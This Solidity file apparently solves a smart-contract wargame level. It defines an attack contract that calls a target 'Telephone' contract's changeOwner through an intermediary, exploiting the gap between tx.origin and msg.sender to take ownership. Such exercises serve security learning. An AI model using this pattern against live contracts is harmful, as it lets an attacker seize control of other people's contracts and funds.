// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

interface ITelephone {
    function changeOwner(address _owner) external;
}

contract AtkTelephone {
    ITelephone target;

    constructor(address _target) {
        target = ITelephone(_target);
    }

    function attack(address _owner) external {
        target.changeOwner(_owner);
    }
}
